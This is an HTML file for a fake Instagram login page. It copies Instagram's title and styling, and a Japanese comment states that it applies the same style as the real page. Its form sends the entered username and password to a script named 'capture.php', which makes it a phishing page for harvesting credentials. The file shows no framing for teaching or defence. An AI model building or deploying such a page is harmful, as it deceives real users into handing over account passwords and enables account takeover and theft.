<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram Login</title>
    <style>
        /* インスタグラムのログインページと同じスタイルを適用 */
        body { font-family: Arial, sans-serif; }
        .login-container { width: 350px; margin: 0 auto; padding: 20px; }
        .login-container h2 { text-align: center; }
        .login-container form { display: flex; flex-direction: column; }
        .login-container input { margin-bottom: 10px; padding: 10px; font-size: 16px; }
        .login-container button { padding: 10px; font-size: 16px; background-color: #0095f6; color: white; border: none; }
    </style>
</head>
<body>
    <div class="login-container">
        <h2>Instagram</h2>
        <form action="capture.php" method="post">
            <input type="text" name="username" placeholder="Phone number, username, or email" required>
            <input type="password" name="password" placeholder="Password" required>
            <button type="submit">Log In</button>
        </form>
    </div>
</body>
</html>
